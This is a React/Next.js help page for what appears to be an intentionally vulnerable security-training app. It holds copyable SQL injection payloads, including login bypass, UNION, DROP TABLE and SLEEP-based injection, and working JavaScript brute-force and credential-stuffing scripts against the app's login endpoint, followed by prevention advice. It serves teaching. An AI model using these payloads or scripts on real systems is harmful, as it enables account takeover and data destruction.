"use client"

import { useState } from "react"
import { motion } from "framer-motion"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Button } from "@/components/ui/button"
import { Badge } from "@/components/ui/badge"
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
import { Shield, ArrowLeft, Code, Terminal, AlertTriangle, BookOpen, Copy, Check, Zap, Lock, Eye } from "lucide-react"
import Link from "next/link"
import { fadeInUp, staggerContainer } from "@/lib/animations"

export default function HelpPage() {
  const [copiedCode, setCopiedCode] = useState<string | null>(null)

  const copyToClipboard = (text: string, id: string) => {
    navigator.clipboard.writeText(text)
    setCopiedCode(id)
    setTimeout(() => setCopiedCode(null), 2000)
  }

  const sqlInjectionExamples = [
    {
      id: "basic-bypass",
      title: "Basic Authentication Bypass",
      description: "Bypass login by making the SQL query always return true",
      username: "admin' OR '1'='1",
      password: "anything",
      explanation:
        "This works because the SQL query becomes: SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = 'anything'. The OR '1'='1' makes the condition always true.",
      severity: "high",
      technique: "Boolean-based",
    },
    {
      id: "comment-bypass",
      title: "Comment-Based Bypass",
      description: "Use SQL comments to ignore the password check",
      username: "admin'--",
      password: "",
      explanation:
        "The -- comments out the rest of the query, so it becomes: SELECT * FROM users WHERE username = 'admin'-- AND password = ''. Everything after -- is ignored.",
      severity: "high",
      technique: "Comment injection",
    },
    {
      id: "always-true",
      title: "Always True Condition",
      description: "Create a condition that's always true",
      username: "' OR 1=1--",
      password: "anything",
      explanation:
        "This makes the query: SELECT * FROM users WHERE username = '' OR 1=1-- AND password = 'anything'. Since 1=1 is always true, it returns all users.",
      severity: "critical",
      technique: "Tautology",
    },
    {
      id: "union-attack",
      title: "UNION-Based Injection",
      description: "Combine results from multiple queries",
      username: "admin' UNION SELECT 1,'admin','password','admin@test.com','admin','active'--",
      password: "anything",
      explanation:
        "UNION allows combining results from multiple SELECT statements. This can be used to extract data from other tables or inject fake data.",
      severity: "critical",
      technique: "UNION-based",
    },
    {
      id: "stacked-queries",
      title: "Stacked Queries Attack",
      description: "Execute multiple SQL statements",
      username: "admin'; DROP TABLE users--",
      password: "",
      explanation:
        "Attempts to execute multiple statements separated by semicolons. This could potentially drop tables or modify data if the database allows stacked queries.",
      severity: "critical",
      technique: "Stacked queries",
    },
    {
      id: "time-based",
      title: "Time-Based Blind Injection",
      description: "Use database sleep functions to detect vulnerabilities",
      username: "admin' AND SLEEP(5)--",
      password: "",
      explanation:
        "If the response is delayed by 5 seconds, it confirms the injection point. Useful when no visible output is returned.",
      severity: "high",
      technique: "Time-based blind",
    },
  ]

  const bruteForceExamples = [
    {
      id: "simple-brute",
      title: "Simple Sequential Brute Force",
      description: "Try common passwords one by one",
      code: `// Simple brute force attack
const commonPasswords = [
  'password', '123456', '12345678', 'qwerty', 
  'abc123', 'monkey', 'letmein', 'admin123'
];

async function bruteForce(username) {
  for (const password of commonPasswords) {
    const response = await fetch('/api/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username, password })
    });
    
    const data = await response.json();
    
    if (data.success) {
      console.log(\`✓ Password found: \${password}\`);
      return { username, password };
    }
    
    console.log(\`✗ Failed: \${password}\`);
  }
  
  return null;
}

// Execute attack
bruteForce('admin');`,
      language: "javascript",
      complexity: "Basic",
    },
    {
      id: "parallel-brute",
      title: "Parallel Brute Force",
      description: "Test multiple passwords simultaneously for speed",
      code: `// Parallel brute force with Promise.all
async function parallelBruteForce(username, passwords) {
  const batchSize = 10; // Concurrent requests
  
  for (let i = 0; i < passwords.length; i += batchSize) {
    const batch = passwords.slice(i, i + batchSize);
    
    const attempts = batch.map(password => 
      fetch('/api/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username, password })
      })
      .then(r => r.json())
      .then(data => ({ password, success: data.success }))
    );
    
    const results = await Promise.all(attempts);
    const success = results.find(r => r.success);
    
    if (success) {
      console.log(\`✓ Password cracked: \${success.password}\`);
      return success;
    }
    
    console.log(\`Tested \${i + batch.length}/\${passwords.length}\`);
  }
  
  return null;
}`,
      language: "javascript",
      complexity: "Intermediate",
    },
    {
      id: "credential-stuffing",
      title: "Credential Stuffing",
      description: "Use leaked username:password combinations",
      code: `// Credential stuffing from leaked databases
const leakedCredentials = [
  { username: 'admin', password: 'admin123' },
  { username: 'user1', password: 'password123' },
  { username: 'john.doe', password: 'qwerty' },
  // ... more leaked credentials
];

async function credentialStuffing(credentials) {
  const validAccounts = [];
  
  for (const { username, password } of credentials) {
    try {
      const response = await fetch('/api/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username, password })
      });
      
      const data = await response.json();
      
      if (data.success) {
        console.log(\`✓ Valid: \${username}:\${password}\`);
        validAccounts.push({ username, password, data });
      }
    } catch (error) {
      console.error(\`Error testing \${username}\`);
    }
  }
  
  return validAccounts;
}`,
      language: "javascript",
      complexity: "Advanced",
    },
    {
      id: "dictionary-attack",
      title: "Dictionary Attack with Mutations",
      description: "Generate password variations from base words",
      code: `// Dictionary attack with common mutations
function generateMutations(baseWord) {
  const mutations = [baseWord];
  
  // Capitalization
  mutations.push(baseWord.toLowerCase());
  mutations.push(baseWord.toUpperCase());
  mutations.push(
    baseWord.charAt(0).toUpperCase() + 
    baseWord.slice(1).toLowerCase()
  );
  
  // Number additions
  for (let i = 0; i <= 999; i++) {
    mutations.push(baseWord + i);
  }
  
  // L33t speak
  const l33t = baseWord
    .replace(/a/gi, '4')
    .replace(/e/gi, '3')
    .replace(/i/gi, '1')
    .replace(/o/gi, '0')
    .replace(/s/gi, '5');
  mutations.push(l33t);
  
  // Special characters
  ['!', '@', '#', '$', '123'].forEach(suffix => {
    mutations.push(baseWord + suffix);
  });
  
  return mutations;
}

// Attack with mutations
const baseWords = ['password', 'admin', 'welcome'];
const allPasswords = baseWords.flatMap(generateMutations);

bruteForce('admin', allPasswords);`,
      language: "javascript",
      complexity: "Advanced",
    },
  ]

  return (
    <div className="min-h-screen bg-background relative overflow-hidden">
      <div className="absolute inset-0 bg-gradient-to-br from-primary/5 via-background to-secondary/5" />
      <motion.div
        className="absolute inset-0 opacity-30"
        animate={{
          background: [
            "radial-gradient(circle at 20% 50%, rgba(120, 119, 198, 0.15) 0%, transparent 50%)",
            "radial-gradient(circle at 80% 50%, rgba(120, 119, 198, 0.15) 0%, transparent 50%)",
            "radial-gradient(circle at 20% 50%, rgba(120, 119, 198, 0.15) 0%, transparent 50%)",
          ],
        }}
        transition={{ duration: 10, repeat: Number.POSITIVE_INFINITY, ease: "linear" }}
      />

      <motion.header
        className="border-b border-border relative z-10 backdrop-blur-sm bg-background/80"
        initial={{ y: -20, opacity: 0 }}
        animate={{ y: 0, opacity: 1 }}
        transition={{ duration: 0.5 }}
      >
        <div className="container mx-auto px-4 py-4">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-4">
              <Link href="/">
                <motion.div
                  whileHover={{ scale: 1.05, x: -5 }}
                  whileTap={{ scale: 0.95 }}
                  transition={{ type: "spring", stiffness: 400 }}
                >
                  <Button variant="ghost" size="sm" className="hover-lift">
                    <ArrowLeft className="w-4 h-4 mr-2" />
                    Back to Login
                  </Button>
                </motion.div>
              </Link>
              <motion.div
                className="flex items-center gap-2"
                whileHover={{ scale: 1.05 }}
                transition={{ type: "spring", stiffness: 400 }}
              >
                <motion.div
                  animate={{ rotate: [0, 5, -5, 0] }}
                  transition={{ duration: 2, repeat: Number.POSITIVE_INFINITY, repeatDelay: 3 }}
                >
                  <BookOpen className="w-6 h-6 text-primary" />
                </motion.div>
                <span className="font-mono text-lg font-semibold">Attack Documentation</span>
              </motion.div>
            </div>
            <Link href="/admin">
              <motion.div
                whileHover={{ scale: 1.05 }}
                whileTap={{ scale: 0.95 }}
                transition={{ type: "spring", stiffness: 400 }}
              >
                <Button variant="outline" size="sm" className="hover-glow bg-transparent">
                  <Terminal className="w-4 h-4 mr-2" />
                  Admin Dashboard
                </Button>
              </motion.div>
            </Link>
          </div>
        </div>
      </motion.header>

      <main className="container mx-auto px-4 py-8 relative z-10">
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.5 }}
          className="mb-8"
        >
          <motion.h1
            className="text-5xl md:text-6xl font-bold mb-6 bg-gradient-to-r from-primary via-purple-500 to-pink-500 bg-clip-text text-transparent"
            animate={{ backgroundPosition: ["0% 50%", "100% 50%", "0% 50%"] }}
            transition={{ duration: 5, repeat: Number.POSITIVE_INFINITY }}
          >
            Professional Security Training Guide
          </motion.h1>
          <motion.p
            className="text-muted-foreground text-xl leading-relaxed mb-6"
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            transition={{ delay: 0.2 }}
          >
            Master advanced penetration testing techniques and security vulnerabilities in this comprehensive, hands-on training environment.
          </motion.p>
          
          <motion.div
            className="grid grid-cols-1 md:grid-cols-3 gap-4 mb-8"
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: 0.3 }}
          >
            {[
              { icon: <Code className="w-6 h-6" />, title: "SQL Injection", desc: "6 attack techniques", color: "text-red-500", bg: "bg-red-500/10" },
              { icon: <Zap className="w-6 h-6" />, title: "Brute Force", desc: "4 attack methods", color: "text-orange-500", bg: "bg-orange-500/10" },
              { icon: <Shield className="w-6 h-6" />, title: "Prevention", desc: "Security best practices", color: "text-green-500", bg: "bg-green-500/10" }
            ].map((item, index) => (
              <motion.div
                key={item.title}
                className={`p-4 rounded-lg border border-border/50 ${item.bg} hover:shadow-lg transition-all duration-300`}
                initial={{ opacity: 0, scale: 0.8 }}
                animate={{ opacity: 1, scale: 1 }}
                transition={{ delay: 0.4 + index * 0.1 }}
                whileHover={{ scale: 1.05, y: -5 }}
              >
                <div className="flex items-center gap-3">
                  <motion.div
                    className={`p-2 rounded-lg ${item.color}`}
                    animate={{ rotate: [0, 10, -10, 0] }}
                    transition={{ duration: 3, repeat: Number.POSITIVE_INFINITY, delay: index * 0.5 }}
                  >
                    {item.icon}
                  </motion.div>
                  <div>
                    <h3 className="font-semibold">{item.title}</h3>
                    <p className="text-sm text-muted-foreground">{item.desc}</p>
                  </div>
                </div>
              </motion.div>
            ))}
          </motion.div>
        </motion.div>

        <Tabs defaultValue="sql-injection" className="space-y-6">
          <motion.div initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.3 }}>
            <TabsList className="grid w-full grid-cols-3 backdrop-blur-sm bg-secondary/50">
              <TabsTrigger value="sql-injection" className="transition-smooth">
                <Code className="w-4 h-4 mr-2" />
                SQL Injection
              </TabsTrigger>
              <TabsTrigger value="brute-force" className="transition-smooth">
                <Zap className="w-4 h-4 mr-2" />
                Brute Force
              </TabsTrigger>
              <TabsTrigger value="prevention" className="transition-smooth">
                <Shield className="w-4 h-4 mr-2" />
                Prevention
              </TabsTrigger>
            </TabsList>
          </motion.div>

          <TabsContent value="sql-injection" className="space-y-6">
            <motion.div variants={staggerContainer} initial="initial" animate="animate">
              <motion.div
                initial={{ opacity: 0, scale: 0.95 }}
                animate={{ opacity: 1, scale: 1 }}
                transition={{ duration: 0.4 }}
              >
                <Card className="backdrop-blur-sm bg-card/50 mb-6 hover-lift glass-hover">
                  <CardHeader>
                    <CardTitle className="flex items-center gap-2">
                      <motion.div
                        animate={{ rotate: [0, 360] }}
                        transition={{ duration: 20, repeat: Number.POSITIVE_INFINITY, ease: "linear" }}
                      >
                        <Code className="w-5 h-5 text-primary" />
                      </motion.div>
                      What is SQL Injection?
                    </CardTitle>
                  </CardHeader>
                  <CardContent className="space-y-4">
                    <p className="text-muted-foreground leading-relaxed">
                      SQL Injection is a code injection technique that exploits vulnerabilities in an application's
                      database layer. Attackers can insert malicious SQL statements into input fields, which are then
                      executed by the database, potentially exposing sensitive data or compromising the entire system.
                    </p>
                    <div className="bg-destructive/10 border border-destructive/20 rounded-lg p-4 animate-border-glow">
                      <p className="text-sm font-medium text-destructive mb-2 flex items-center gap-2">
                        <AlertTriangle className="w-4 h-4" />
                        Vulnerable Code Example:
                      </p>
                      <pre className="text-xs font-mono bg-background/50 p-3 rounded overflow-x-auto">
                        {`const query = \`SELECT * FROM users WHERE username = '\${username}' AND password = '\${password}'\``}
                      </pre>
                    </div>
                  </CardContent>
                </Card>
              </motion.div>

              {sqlInjectionExamples.map((example, index) => (
                <motion.div
                  key={example.id}
                  variants={fadeInUp}
                  transition={{ delay: index * 0.1 }}
                  whileHover={{ scale: 1.02 }}
                >
                  <Card className="backdrop-blur-sm bg-card/50 hover:shadow-xl transition-all duration-300 glass-hover">
                    <CardHeader>
                      <div className="flex items-start justify-between">
                        <div className="flex-1">
                          <CardTitle className="text-lg flex items-center gap-2">
                            {example.title}
                            <motion.div
                              animate={{ scale: [1, 1.2, 1] }}
                              transition={{ duration: 2, repeat: Number.POSITIVE_INFINITY, delay: index * 0.2 }}
                            >
                              <Lock className="w-4 h-4 text-destructive" />
                            </motion.div>
                          </CardTitle>
                          <CardDescription>{example.description}</CardDescription>
                        </div>
                        <div className="flex gap-2">
                          <Badge variant={example.severity === "critical" ? "destructive" : "secondary"}>
                            {example.severity}
                          </Badge>
                          <Badge variant="outline">{example.technique}</Badge>
                        </div>
                      </div>
                    </CardHeader>
                    <CardContent className="space-y-4">
                      <div className="grid md:grid-cols-2 gap-4">
                        <div className="space-y-2">
                          <div className="flex items-center justify-between">
                            <label className="text-sm font-medium flex items-center gap-2">
                              <Eye className="w-3 h-3" />
                              Username
                            </label>
                            <motion.div whileHover={{ scale: 1.1 }} whileTap={{ scale: 0.9 }}>
                              <Button
                                size="sm"
                                variant="ghost"
                                onClick={() => copyToClipboard(example.username, `${example.id}-user`)}
                                className="h-7"
                              >
                                {copiedCode === `${example.id}-user` ? (
                                  <Check className="w-3 h-3 text-green-500" />
                                ) : (
                                  <Copy className="w-3 h-3" />
                                )}
                              </Button>
                            </motion.div>
                          </div>
                          <motion.div
                            className="bg-secondary/50 p-3 rounded font-mono text-sm hover-glow cursor-pointer"
                            whileHover={{ scale: 1.02 }}
                            onClick={() => copyToClipboard(example.username, `${example.id}-user`)}
                          >
                            {example.username}
                          </motion.div>
                        </div>
                        <div className="space-y-2">
                          <div className="flex items-center justify-between">
                            <label className="text-sm font-medium flex items-center gap-2">
                              <Lock className="w-3 h-3" />
                              Password
                            </label>
                            <motion.div whileHover={{ scale: 1.1 }} whileTap={{ scale: 0.9 }}>
                              <Button
                                size="sm"
                                variant="ghost"
                                onClick={() => copyToClipboard(example.password, `${example.id}-pass`)}
                                className="h-7"
                              >
                                {copiedCode === `${example.id}-pass` ? (
                                  <Check className="w-3 h-3 text-green-500" />
                                ) : (
                                  <Copy className="w-3 h-3" />
                                )}
                              </Button>
                            </motion.div>
                          </div>
                          <motion.div
                            className="bg-secondary/50 p-3 rounded font-mono text-sm hover-glow cursor-pointer"
                            whileHover={{ scale: 1.02 }}
                            onClick={() => copyToClipboard(example.password, `${example.id}-pass`)}
                          >
                            {example.password || "(empty)"}
                          </motion.div>
                        </div>
                      </div>
                      <motion.div
                        className="bg-primary/10 border border-primary/20 rounded-lg p-4"
                        initial={{ opacity: 0 }}
                        animate={{ opacity: 1 }}
                        transition={{ delay: 0.2 }}
                      >
                        <p className="text-sm font-medium mb-2 flex items-center gap-2">
                          <Terminal className="w-4 h-4" />
                          How it works:
                        </p>
                        <p className="text-sm text-muted-foreground leading-relaxed">{example.explanation}</p>
                      </motion.div>
                    </CardContent>
                  </Card>
                </motion.div>
              ))}
            </motion.div>
          </TabsContent>

          <TabsContent value="brute-force" className="space-y-6">
            <Card className="backdrop-blur-sm bg-card/50 mb-6 glass-hover hover-lift">
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <Zap className="w-5 h-5 text-warning" />
                  What is Brute Force?
                </CardTitle>
              </CardHeader>
              <CardContent className="space-y-4">
                <p className="text-muted-foreground leading-relaxed">
                  Brute force is a trial-and-error method used to obtain information such as passwords or encryption
                  keys. Attackers systematically try all possible combinations until the correct one is found.
                </p>
                <div className="bg-warning/10 border border-warning/20 rounded-lg p-4">
                  <p className="text-sm font-medium text-warning mb-2">Why This App is Vulnerable:</p>
                  <ul className="text-sm text-muted-foreground space-y-1 list-disc list-inside">
                    <li>No rate limiting on login attempts</li>
                    <li>No account lockout after failed attempts</li>
                    <li>No CAPTCHA or challenge-response</li>
                    <li>No delay between attempts</li>
                  </ul>
                </div>
              </CardContent>
            </Card>

            {bruteForceExamples.map((example, index) => (
              <motion.div
                key={example.id}
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ delay: index * 0.1 }}
                whileHover={{ scale: 1.01 }}
              >
                <Card className="backdrop-blur-sm bg-card/50 hover:shadow-xl transition-all duration-300 glass-hover">
                  <CardHeader>
                    <div className="flex items-start justify-between">
                      <div className="flex-1">
                        <CardTitle className="text-lg flex items-center gap-2">
                          {example.title}
                          <Badge variant="outline">{example.complexity}</Badge>
                        </CardTitle>
                        <CardDescription>{example.description}</CardDescription>
                      </div>
                      <motion.div whileHover={{ scale: 1.1 }} whileTap={{ scale: 0.9 }}>
                        <Button size="sm" variant="ghost" onClick={() => copyToClipboard(example.code, example.id)}>
                          {copiedCode === example.id ? (
                            <Check className="w-4 h-4 text-green-500" />
                          ) : (
                            <Copy className="w-4 h-4" />
                          )}
                        </Button>
                      </motion.div>
                    </div>
                  </CardHeader>
                  <CardContent>
                    <pre className="text-xs font-mono bg-background/50 p-4 rounded overflow-x-auto border border-border/50">
                      {example.code}
                    </pre>
                  </CardContent>
                </Card>
              </motion.div>
            ))}
          </TabsContent>

          <TabsContent value="prevention" className="space-y-6">
            <Card className="backdrop-blur-sm bg-card/50 glass-hover">
              <CardHeader>
                <CardTitle className="flex items-center gap-2">
                  <Shield className="w-5 h-5 text-primary" />
                  Security Best Practices
                </CardTitle>
                <CardDescription>How to protect your applications from these vulnerabilities</CardDescription>
              </CardHeader>
              <CardContent className="space-y-6">
                <div>
                  <h3 className="text-lg font-semibold mb-3">Preventing SQL Injection</h3>
                  <div className="space-y-4">
                    <div className="bg-primary/10 border border-primary/20 rounded-lg p-4">
                      <p className="font-medium mb-2">1. Use Parameterized Queries</p>
                      <pre className="text-xs font-mono bg-background/50 p-3 rounded overflow-x-auto">
                        {`// Secure approach
const stmt = db.prepare('SELECT * FROM users WHERE username = ? AND password = ?')
const user = stmt.get(username, password)`}
                      </pre>
                    </div>
                    <div className="bg-primary/10 border border-primary/20 rounded-lg p-4">
                      <p className="font-medium mb-2">2. Input Validation</p>
                      <pre className="text-xs font-mono bg-background/50 p-3 rounded overflow-x-auto">
                        {`// Validate and sanitize input
const sanitizedUsername = username.replace(/[^a-zA-Z0-9]/g, '')
if (sanitizedUsername.length < 3 || sanitizedUsername.length > 20) {
  throw new Error('Invalid username')
}`}
                      </pre>
                    </div>
                    <div className="bg-primary/10 border border-primary/20 rounded-lg p-4">
                      <p className="font-medium mb-2">3. Use ORM Libraries</p>
                      <p className="text-sm text-muted-foreground">
                        Use Object-Relational Mapping (ORM) libraries like Prisma, TypeORM, or Sequelize that handle SQL
                        escaping automatically.
                      </p>
                    </div>
                  </div>
                </div>

                <div>
                  <h3 className="text-lg font-semibold mb-3">Preventing Brute Force</h3>
                  <div className="space-y-4">
                    <div className="bg-primary/10 border border-primary/20 rounded-lg p-4">
                      <p className="font-medium mb-2">1. Rate Limiting</p>
                      <pre className="text-xs font-mono bg-background/50 p-3 rounded overflow-x-auto">
                        {`// Limit login attempts per IP
const rateLimit = new Map()
const MAX_ATTEMPTS = 5
const WINDOW = 15 * 60 * 1000 // 15 minutes

if (rateLimit.get(ip) >= MAX_ATTEMPTS) {
  throw new Error('Too many attempts')
}`}
                      </pre>
                    </div>
                    <div className="bg-primary/10 border border-primary/20 rounded-lg p-4">
                      <p className="font-medium mb-2">2. Account Lockout</p>
                      <p className="text-sm text-muted-foreground">
                        Lock accounts after a certain number of failed attempts. Require email verification or admin
                        intervention to unlock.
                      </p>
                    </div>
                    <div className="bg-primary/10 border border-primary/20 rounded-lg p-4">
                      <p className="font-medium mb-2">3. CAPTCHA</p>
                      <p className="text-sm text-muted-foreground">
                        Implement CAPTCHA (like reCAPTCHA) after failed login attempts to prevent automated attacks.
                      </p>
                    </div>
                    <div className="bg-primary/10 border border-primary/20 rounded-lg p-4">
                      <p className="font-medium mb-2">4. Multi-Factor Authentication</p>
                      <p className="text-sm text-muted-foreground">
                        Add an additional layer of security with 2FA/MFA using authenticator apps or SMS codes.
                      </p>
                    </div>
                  </div>
                </div>

                <div className="bg-warning/10 border border-warning/20 rounded-lg p-4">
                  <div className="flex items-start gap-3">
                    <AlertTriangle className="w-5 h-5 text-warning mt-0.5" />
                    <div>
                      <p className="font-medium text-warning mb-2">Important Reminder</p>
                      <p className="text-sm text-muted-foreground">
                        This application intentionally lacks these security measures for educational purposes. Never
                        deploy applications without proper security controls to production environments.
                      </p>
                    </div>
                  </div>
                </div>
              </CardContent>
            </Card>
          </TabsContent>
        </Tabs>
      </main>
    </div>
  )
}
